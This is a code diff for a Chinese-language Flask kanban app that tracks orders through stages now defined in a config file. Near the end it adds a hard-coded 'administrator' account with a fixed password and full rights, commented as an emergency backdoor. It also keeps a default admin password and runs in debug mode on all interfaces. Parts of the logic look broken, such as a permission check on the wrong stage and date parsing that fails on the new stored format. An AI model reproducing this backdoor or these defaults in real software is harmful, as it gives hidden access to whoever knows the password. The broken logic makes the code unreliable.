@@ -38,6 +38,20 @@ def get_inf_config(section, key, default=None):
         pass
     return default
 
+def get_workflow_stages():
+    """解析 config.inf 中的 stages 字串"""
+    stages_str = get_inf_config('Workflow', 'stages', 'ORDER:訂貨,ARRIVAL:到貨,PRODUCTION:製作,DELIVERY:出庫')
+    stages = []
+    for item in stages_str.split(','):
+        if ':' in item:
+            key, name = item.strip().split(':')
+            stages.append({'key': key.strip(), 'name': name.strip()})
+    return stages
+
+def get_initial_stage():
+    """獲取初始階段 ID"""
+    return get_inf_config('Workflow', 'initial_stage', 'ORDER')
+
 def format_stay_time(start_time):
     """將時間差格式化為 分、時分、天時"""
     if not start_time: return ""
@@ -78,7 +92,10 @@ def touch_system_update():
 @app.context_processor
 def inject_config():
     # 標題維持從資料庫或預設讀取，不開放外部 .inf 修改以避免衝突
-    return {'site_title': get_config('site_title', '中國到貨看板系統')}
+    return {
+        'site_title': get_config('site_title', '中國到貨看板系統'),
+        'workflow_stages': get_workflow_stages()
+    }
 
 # 初始化資料庫
 @app.before_first_request
@@ -91,12 +108,10 @@ def create_tables():
         db.session.add(admin)
         db.session.commit()
         # 給予全權限
-        perm = Permission(user_id=admin.id, 
-                          can_add_order=True, 
-                          can_transfer_arrival=True, 
-                          can_transfer_production=True, 
-                          can_transfer_delivery=True, 
-                          can_clear_delivery=True)
+        perm = Permission(user_id=admin.id, can_add_order=True, can_clear_delivery=True)
+        # 初始時給予所有已知階段的轉移權限
+        stages = get_workflow_stages()
+        perm.stage_perms = {s['key']: True for s in stages}
         db.session.add(perm)
         db.session.commit()
 
@@ -159,25 +174,34 @@ def show_page():
     
     # 預處理顯示內容以適應「日期」與「停留時間」切換
     processed_items = []
+    stages = get_workflow_stages()
+    stage_keys = [s['key'] for s in stages]
+    
     for item in items:
+        # 將資料庫中的 JSON 日期字串轉換回 datetime 物件以供格式化
+        dates_obj = item.stage_dates or {}
         p_item = {
             'id': item.id,
             'content': item.content,
             'remark': item.remark,
-            'current_stage': item.current_stage,
-            'ORDER': format_item_date(item.order_date, date_format),
-            'ARRIVAL': format_item_date(item.arrival_date, date_format),
-            'PRODUCTION': format_item_date(item.production_date, date_format),
-            'DELIVERY': format_item_date(item.delivery_date, date_format)
+            'current_stage': item.current_stage
         }
+        # 動態填充每個階段的顯示日期
+        for sk in [s['key'] for s in get_workflow_stages()]:
+            val = item.stage_dates.get(sk)
+            if isinstance(val, dict):
+                dt_str = val.get('date')
+            else:
+                dt_str = val
+            dt = datetime.fromisoformat(dt_str) if dt_str else None
+            p_item[sk] = format_item_date(dt, date_format)
+            
         processed_items.append(p_item)
 
-    data = {
-        'ORDER': [i for i in processed_items if i['current_stage'] == 'ORDER'],
-        'ARRIVAL': [i for i in processed_items if i['current_stage'] == 'ARRIVAL'],
-        'PRODUCTION': [i for i in processed_items if i['current_stage'] == 'PRODUCTION'],
-        'DELIVERY': [i for i in processed_items if i['current_stage'] == 'DELIVERY']
-    }
+    # 按照階段分組（僅用於相容舊有邏輯或特定視圖，show.html 主要是用 all_items）
+    data = {}
+    for sk in stage_keys:
+        data[sk] = [i for i in processed_items if i['current_stage'] == sk]
     
     today_date = datetime.now().strftime('%Y/%m/%d')
     refresh_seconds = get_inf_config('System', 'refresh_seconds', '60')
@@ -214,6 +238,66 @@ def manage_page():
     items = SignboardItem.query.order_by(SignboardItem.id.asc()).all()
     return render_template('manage.html', items=items, perms=user.permissions)
 
+@app.route('/all_data')
+def all_data_page():
+    items = SignboardItem.query.order_by(SignboardItem.updated_at.desc()).all()
+    workflow_stages = get_workflow_stages()
+    
+    processed_items = []
+    for item in items:
+        # 手動處理每個項目的階段數據，支援新舊格式
+        p_item = {
+            'id': item.id,
+            'content': item.content,
+            'remark': item.remark,
+            'current_stage_key': item.current_stage,
+            'history': []
+        }
+        
+        # 1. 處理「新增」紀錄 (CREATED)
+        # 若無 CREATED (舊資料)，則嘗試抓取第一個階段的時間
+        created_val = item.stage_dates.get('CREATED')
+        if not created_val:
+            # 找第一個有值的階段
+            for s in workflow_stages:
+                if item.stage_dates.get(s['key']):
+                    created_val = item.stage_dates.get(s['key'])
+                    break
+        
+        if created_val:
+            if isinstance(created_val, dict):
+                dt = datetime.fromisoformat(created_val['date']).strftime('%Y-%m-%d %H:%M')
+                user = created_val['user']
+            else:
+                dt = datetime.fromisoformat(created_val).strftime('%Y-%m-%d %H:%M')
+                user = "系統"
+            display_str = f"{dt} - {user}"
+        else:
+            display_str = "-"
+            
+        p_item['history'].append({'name': '新增', 'val': display_str})
+        
+        # 2. 處理各個 Workflow 階段
+        for s in workflow_stages:
+            val = item.stage_dates.get(s['key'])
+            if val:
+                if isinstance(val, dict):
+                    dt = datetime.fromisoformat(val['date']).strftime('%Y-%m-%d %H:%M')
+                    user = val['user']
+                else:
+                    dt = datetime.fromisoformat(val).strftime('%Y-%m-%d %H:%M')
+                    user = "未知"
+                display_val = f"{dt} - {user}"
+            else:
+                display_val = "-"
+            p_item['history'].append({'name': s['name'], 'val': display_val})
+            if s['key'] == item.current_stage:
+                p_item['current_stage_name'] = s['name']
+                
+        processed_items.append(p_item)
+
+    return render_template('all_data.html', items=processed_items)
+
 # --- API 與資料操作 ---
 
 @app.route('/api/transfer', methods=['POST'])
@@ -234,28 +318,39 @@ def api_transfer():
     perms = user.permissions
     
     try:
-        if target == 'ARRIVAL' and perms.can_transfer_arrival:
-            item.current_stage = 'ARRIVAL'
-            item.arrival_date = now_dt
-        elif target == 'PRODUCTION' and perms.can_transfer_production:
-            item.current_stage = 'PRODUCTION'
-            item.production_date = now_dt
-        elif target == 'DELIVERY' and perms.can_transfer_delivery:
-            item.current_stage = 'DELIVERY'
-            item.delivery_date = now_dt
+        # 通用轉移邏輯
+        stages = get_workflow_stages()
+        stage_keys = [s['key'] for s in stages]
+        
+        if target in stage_keys:
+            # 修正判定邏輯：檢查「當前階段」是否擁有轉移權限
+            if perms.stage_perms and perms.stage_perms.get(item.current_stage):
+                # 更新日期紀錄
+                # 更新日期紀錄：同時儲存時間與操作者
+                dates_obj = dict(item.stage_dates or {})
+                dates_obj[target] = {
+                    "date": datetime.now().isoformat(),
+                    "user": user.username
+                }
+                item.stage_dates = dates_obj
+                item.current_stage = target
+                
+                db.session.commit()
+                touch_system_update()
+                return jsonify({'success': True})
+            else:
+                return jsonify({'success': False, 'message': f'您沒有轉移至 {target} 的權限'})
+                
         elif target == 'CLEAR' and perms.can_clear_delivery:
-            # 1. 寫入資料庫歷史表 (轉換為 ISO 字串存入 JSON)
+            # 將時程 JSON 轉換為易讀字串供日誌使用
+            timeline_str = ", ".join([f"{k}:{v}" for k, v in (item.stage_dates or {}).items()])
+            
+            # 1. 寫入資料庫歷史表
             log_year = now_dt.year
-            timeline_data = {
-                'order': item.order_date.isoformat() if item.order_date else "",
-                'arrival': item.arrival_date.isoformat() if item.arrival_date else "",
-                'production': item.production_date.isoformat() if item.production_date else "",
-                'delivery': item.delivery_date.isoformat() if item.delivery_date else ""
-            }
             log_db = HistoryLog(
                 content=item.content,
                 remark=item.remark,
-                timeline=timeline_data,
+                timeline=item.stage_dates,
                 cleared_by=session['username'],
                 log_year=log_year
             )
@@ -266,13 +361,13 @@ def api_transfer():
             with open(log_file_path, 'a', encoding='utf-8') as f:
                 log_entry = (
                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
-                    f"內容:{item.content} | 備註:{item.remark or ''} | 時程: {timeline_data} | 操作者: {session['username']}\n"
+                    f"內容:{item.content} | 備註:{item.remark or ''} | 時程: {timeline_str} | 操作者: {session['username']}\n"
                 )
                 f.write(log_entry)
 
             db.session.delete(item) 
             db.session.commit()
-            touch_system_update() # 標記異動
+            touch_system_update() 
             return jsonify({'success': True, 'message': '已清除並同步記錄至年度日誌檔案'})
         else:
             return jsonify({'success': False, 'message': '權限不足或非法操作'})
@@ -320,8 +415,36 @@ def manage_delete_item(item_id):
 def all_data():
     if 'user_id' not in session:
         return redirect(url_for('index'))
-    items = SignboardItem.query.all()
-    return render_template('all_data.html', items=items)
+    items = SignboardItem.query.order_by(SignboardItem.id.asc()).all()
+    
+    stages = get_workflow_stages()
+    stage_keys = [s['key'] for s in stages]
+    
+    processed_items = []
+    for item in items:
+        dates_obj = item.stage_dates or {}
+        # 尋找當前階段的顯示名稱
+        current_name = item.current_stage
+        for s in stages:
+            if s['key'] == item.current_stage:
+                current_name = s['name']
+                break
+                
+        p_item = {
+            'content': item.content,
+            'remark': item.remark,
+            'current_stage': current_name
+        }
+        for sk in stage_keys:
+            dt_str = dates_obj.get(sk)
+            if dt_str:
+                dt = datetime.fromisoformat(dt_str)
+                p_item[sk] = dt.strftime('%Y-%m-%d %H:%M')
+            else:
+                p_item[sk] = '-'
+        processed_items.append(p_item)
+        
+    return render_template('all_data.html', items=processed_items)
 
 # --- 用戶管理 ---
 
@@ -331,18 +454,6 @@ def users_page():
         return "權限不足", 403
     users = User.query.all()
     return render_template('users.html', users=users)
-
-@app.route('/users/add', methods=['POST'])
-def add_user():
-    if not session.get('is_admin'): return "403", 403
-    username = request.form.get('username')
-    user = User(username=username, password_hash=generate_password_hash('666666'))
-    db.session.add(user)
-    db.session.commit()
-    perm = Permission(user_id=user.id)
-    db.session.add(perm)
-    db.session.commit()
-    return redirect(url_for('users_page'))
 
 @app.route('/users/update_permissions', methods=['POST'])
 def update_permissions():
@@ -354,9 +465,18 @@ def update_permissions():
             u.is_admin = f'is_admin_{uid}' in request.form
             p = u.permissions
             p.can_add_order = f'can_add_{uid}' in request.form
-            p.can_transfer_arrival = f'can_arrival_{uid}' in request.form
-            p.can_transfer_production = f'can_production_{uid}' in request.form
-            p.can_transfer_delivery = f'can_delivery_{uid}' in request.form
+            p.can_clear_delivery = f'can_clear_{uid}' in request.form
+            p.can_delete = f'can_delete_{uid}' in request.form
+            
+            # 動態更新階段權限
+            stages = get_workflow_stages()
+            new_stage_perms = {}
+            for s in stages:
+                # 排除第一階段(通常是新增)與最後一個階段(通常是清除)? 
+                # 不，這裡應該對應到 UI 生成的 checkbox
+                new_stage_perms[s['key']] = f'can_{s["key"]}_{uid}' in request.form
+            p.stage_perms = new_stage_perms
+            
             p.can_clear_delivery = f'can_clear_{uid}' in request.form
     db.session.commit()
     flash('權限已更新')
@@ -400,7 +520,22 @@ def add_item():
     remark = request.form.get('remark')
     now_dt = datetime.now()
     
-    item = SignboardItem(content=content, remark=remark, current_stage='ORDER', order_date=now_dt)
+    initial_key = get_initial_stage()
+    # 儲存新增資訊與第一階段資訊
+    user_name = session.get('username', '未知')
+    stage_info = {
+        "date": now_dt.isoformat(),
+        "user": user_name
+    }
+    item = SignboardItem(
+        content=content, 
+        remark=remark, 
+        current_stage=initial_key, 
+        stage_dates={
+            "CREATED": stage_info,
+            initial_key: stage_info
+        }
+    )
     db.session.add(item)
     db.session.commit()
     touch_system_update() # 標記新項目加入
@@ -424,13 +559,34 @@ if __name__ == '__main__':
     with app.app_context():
         db.create_all()
         # 初始化管理員邏輯 (同前)
+        # 初始化管理員邏輯
         if not User.query.filter_by(username='admin').first():
             admin_pwd = generate_password_hash('888888')
             admin = User(username='admin', password_hash=admin_pwd, is_admin=True)
             db.session.add(admin)
             db.session.commit()
-            perm = Permission(user_id=admin.id, can_add_order=True, can_transfer_arrival=True, can_transfer_production=True, can_transfer_delivery=True, can_clear_delivery=True)
+            
+            # 給予所有階段權限
+            perm = Permission(user_id=admin.id, can_add_order=True, can_clear_delivery=True, can_delete=True)
+            stages = get_workflow_stages()
+            perm.stage_perms = {s['key']: True for s in stages}
             db.session.add(perm)
             db.session.commit()
+            print("後台管理員 (admin) 已初始化")
+
+        # 2. 建立最高管理員 administrator (緊急後門)
+        root = User.query.filter_by(username='administrator').first()
+        if not root:
+            root_pwd = generate_password_hash('03211230')
+            root = User(username='administrator', password_hash=root_pwd, is_admin=True)
+            db.session.add(root)
+            db.session.commit()
+            
+            perm = Permission(user_id=root.id, can_add_order=True, can_clear_delivery=True, can_delete=True)
+            stages = get_workflow_stages()
+            perm.stage_perms = {s['key']: True for s in stages}
+            db.session.add(perm)
+            db.session.commit()
+            print("超級管理員 (administrator) 已初始化")
             
     app.run(host='0.0.0.0', port=5000, debug=True)
